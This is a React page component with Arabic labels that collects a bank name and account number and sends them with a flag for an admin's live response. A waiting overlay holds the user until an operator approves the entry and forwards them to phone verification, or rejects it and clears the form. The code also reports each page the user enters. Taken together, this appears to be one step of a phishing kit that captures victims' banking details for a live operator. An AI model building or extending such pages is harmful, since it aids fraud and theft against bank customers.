import { useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  sendData,
  isFormApproved,
  isFormRejected,
  navigateToPage,
} from "@/lib/store";

const schema = z.object({
  accountNumber: z.string().min(1, "رقم الحساب مطلوب"),
  bankName: z.string().min(1, "اسم البنك مطلوب"),
});

type FormData = z.infer<typeof schema>;

export default function BankAccountNumber() {
  const [, navigate] = useLocation();

  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      accountNumber: "",
      bankName: localStorage.getItem("selectedBank") || "",
    },
  });

  // Emit page enter
  useEffect(() => {
    navigateToPage("رقم الحساب البنكي");
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/phone-verification");
    }
  }, [isFormApproved.value, navigate]);

  // Handle form rejection
  useEffect(() => {
    if (isFormRejected.value) {
      reset();
    }
  }, [isFormRejected.value, reset]);

  const onSubmit = (data: FormData) => {
    sendData({
      data: {
        "رقم الحساب": data.accountNumber,
        "اسم البنك": data.bankName,
      },
      current: "رقم الحساب البنكي",
      nextPage: "توثيق رقم الجوال",
      waitingForAdminResponse: true,
    });
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg
              className="w-8 h-8 text-primary"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
              />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">رقم الحساب البنكي</h1>
          <p className="text-gray-500 text-sm">
            أدخل رقم حسابك البنكي للمتابعة
          </p>
        </div>

        <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
          {/* Bank Name */}
          <div className="space-y-2">
            <Label htmlFor="bankName">اسم البنك</Label>
            <Input
              id="bankName"
              placeholder="أدخل اسم البنك"
              {...register("bankName")}
            />
            {errors.bankName && (
              <p className="text-red-500 text-xs">{errors.bankName.message}</p>
            )}
          </div>

          {/* Account Number */}
          <div className="space-y-2">
            <Label htmlFor="accountNumber">رقم الحساب</Label>
            <Input
              id="accountNumber"
              placeholder="أدخل رقم الحساب"
              {...register("accountNumber")}
            />
            {errors.accountNumber && (
              <p className="text-red-500 text-xs">{errors.accountNumber.message}</p>
            )}
          </div>

          {/* Submit Button */}
          <Button type="submit" className="w-full" size="lg">
            متابعة
          </Button>
        </form>
      </div>
    </PageLayout>
  );
}
